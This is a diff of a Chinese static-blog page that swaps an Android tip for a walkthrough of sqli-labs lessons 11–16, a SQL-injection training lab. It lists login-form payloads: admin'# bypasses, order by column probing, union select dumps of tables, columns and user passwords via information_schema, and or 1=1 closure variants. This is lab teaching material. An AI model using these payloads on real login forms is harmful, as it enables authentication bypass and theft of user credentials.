@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="用ScrollView底部显示不全的解决方案, 比企谷八幡">
+    <meta name="keywords" content="less11-xx, 比企谷八幡">
     <meta name="description" content="用我三生烟火,换你一世迷离。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>用ScrollView底部显示不全的解决方案 | 比企谷八幡</title>
+    <title>less11-xx | 比企谷八幡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">用ScrollView底部显示不全的解决方案</h1>
+                    <h1 class="description center-align post-title">less11-xx</h1>
                 </div>
             </div>
         </div>
@@ -429,9 +429,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli-labs/">
+                                <span class="chip bg-color">sqli-labs</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -443,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-29
+                    2020-11-21
                 </div>
                 
 
@@ -457,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    68
+                    866
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -474,7 +482,49 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>解决方式：在底部最后两行加两个换行</p>
+                <ul>
+<li>注1:从现在less11开始,进入post的世界了,前十关都是get请求,post请求在网址上看不见,要开Burpsuit等工具可以看到。下面为为了方便,都以F12中的抓包方式来查看表单<h2 id="1-less11"><a href="#1-less11" class="headerlink" title="1.less11"></a>1.less11</h2></li>
+</ul>
+<p>1.通过查看表单中的信息可以知道,less11的请求就只有简单的username和password,并且值就是我们在输入框输入的值<br><a href="https://imgchr.com/i/DlorZD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlorZD.png" alt=""></a><br>2.假设我们一直存在账号admin，常时通过逻辑改写使用万能密码:  </p>
+<pre><code>username框中输入 admin'#
+password框随便输</code></pre><p>结果会发现可以也能登陆<br><a href="https://imgchr.com/i/DlIsCn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlIsCn.png" alt=""></a></p>
+<p>原理:</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#显然,单引号构造了admin的闭合,然后后面的代码都被注释掉了</span>
+<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> xx <span class="token keyword">where</span> username<span class="token operator">=</span>admin'<span class="token comment" spellcheck="true"># and password='xx' </span></code></pre>
+<p>3.测试列数<br>在账号框中输入如下内容,order by 2的时候能正确返回,3的时候不返回</p>
+<pre><code>admin'  order by 3#
+
+admin'  order by 2#</code></pre><p><a href="https://imgchr.com/i/DlqCB6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlqCB6.png" alt="返回失败的页面"></a></p>
+<p><strong>* 结论:表中数据有两列*</strong></p>
+<h3 id="4-union注入获取数据"><a href="#4-union注入获取数据" class="headerlink" title="4.union注入获取数据"></a>4.union注入获取数据</h3><p>注意:这里username必须是不存在的,否则会正常输出admin,然后联合查询,这样的话username和password就会对应查找到联合查询的值</p>
+<pre><code>Username：1admin'union select 1,database()# passwd=1（任意密码）</code></pre><p><a href="https://imgchr.com/i/D3ZWxs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3ZWxs.png" alt="获取数据库名"></a></p>
+<p> <strong>*由此我们可以发现,把账号名按章上面的格式输入,密码随便输,可以回显想要的数据。找到注入点后,可以开始获取敏感数据了,获取数据库名,接着获取表名,然后获取列名,最后把整个列的数据爆破出来    *</strong></p>
+<p>下面做一下完整演示,只写username框的内容(其实这些语句前面已经讲过了,less1中有给出爆数据库中各个数据的方法,重点在于找到注入点):</p>
+<ul>
+<li>1.获取当前数据库名<pre><code>1admin'union select 1,database()# passwd=1（任意密码）</code></pre><ul>
+<li>2.获取所有表名(由1知数据库名security) <pre><code>1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema="security"# </code></pre></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>3.获取user表中所有数据</p>
+<pre><code>1admin union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p>
+</li>
+<li><p>4.爆数据</p>
+</li>
+</ul>
+<pre><code>把id=2的username和password找出来
+1adimin union select 1,username,password from users where id=2 --+</code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>双引号单括号闭合: (“admin”),其余不变</p>
+<h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p>1.首先测试 admin ,发现由报错<br><a href="https://imgchr.com/i/D3NqHS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3NqHS.png" alt="D3NqHS.png"></a><br><strong><em>所以判断出是单引号+单括号的闭合: (‘admin’)</em></strong><br>登陆成功的用户名:</p>
+<pre><code>admin')#</code></pre><p>2.当登陆成功时,页面不会由任何数据回显,但是会显示successfully，所以判断这是布尔盲注,盲注手法不再赘述<br><a href="https://imgchr.com/i/D3UiHU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3UiHU.png" alt="D3UiHU.png"></a></p>
+<h2 id="四-less14"><a href="#四-less14" class="headerlink" title="四.less14"></a>四.less14</h2><p>依旧是盲注<br><strong><em>本题重点还判断是闭合类型</em></strong><br>1.首先测试单引号’,发现没有报错回显,测试”,有报错回显<br><a href="https://imgchr.com/i/D3U4VU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3U4VU.png" alt=""></a><br><strong><em>判断出是双引号闭合：”admin”</em></strong></p>
+<pre><code>admin"#</code></pre><p>其他的同less13</p>
+<h2 id="五-less15"><a href="#五-less15" class="headerlink" title="五.less15"></a>五.less15</h2><p>本关没有任何提示,在猜测闭合类型的时候,只能慢慢试(本关是单引号闭合)<br>思路:<br>可以用下面四种最基础的闭合方式试试哪种能实现万能登陆</p>
+<pre><code>admin1' or 1=1#  (这关这里可以过)
+admi1n') or 1=1# 
+admi1n" or 1=1#
+admi1n") or 1=1#</code></pre><p>用延时注入进行猜解,不赘述</p>
+<h2 id="六-less16"><a href="#六-less16" class="headerlink" title="六.less16"></a>六.less16</h2><p>同less15,本关的闭合类型是双引号+单括号闭合,测试方法和其余的地方同less15</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -518,7 +568,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://1766095699.github.io/2020/07/29/yong-scrollview-di-bu-xian-shi-bu-quan-de-jie-jue-fang-an/">https://1766095699.github.io/2020/07/29/yong-scrollview-di-bu-xian-shi-bu-quan-de-jie-jue-fang-an/</a>
+                    <a href="https://1766095699.github.io/2020/11/21/less11-xx/">https://1766095699.github.io/2020/11/21/less11-xx/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -555,7 +605,15 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/sqli-labs/">
+                                    <span class="chip bg-color">sqli-labs</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -598,7 +656,7 @@
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-07-29T22-54-59',
+        id: '2020-11-21T10-00-14',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -626,68 +684,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/07/31/oxchart-de-xiang-xi-yong-fa/">
+                <a href="/2020/11/21/less19/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="OXChart的详细用法">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="less19">
                         
-                        <span class="card-title">OXChart的详细用法</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            第三方库来源(原作者的github)：原作者github：https://github.com/openXu/OXChart
-一.类库接入implementation 'com.openxu.viewlib:OXViewLib:xxx'
-/
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-31
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/" class="post-category">
-                                    安卓开发
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">
-                        <span class="chip bg-color">安卓开发</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BB%9F%E8%AE%A1%E5%9B%BE/">
-                        <span class="chip bg-color">统计图</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/07/29/weight-shu-xing-de-ying-yong/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="weight属性的应用">
-                        
-                        <span class="card-title">weight属性的应用</span>
+                        <span class="card-title">less19</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -700,8 +703,47 @@
                         
                     </div>
                     <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-21
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            灿若星河
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/11/20/less5-10/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="less5-10">
+                        
+                        <span class="card-title">less5-10</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+注1:从本节开始忽略order by的步骤,因为都是3所以为了方便不再进行赘述
+注2:less5-10中,除了less7要求是用outfile 的方式来进行注入,其他的关卡界面都一样,只有sql语句返回true才会显示语句,否则不显示如下
+                        
+                    </div>
+                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-20
                             </span>
                         <span class="publish-author">
                             
@@ -710,6 +752,18 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
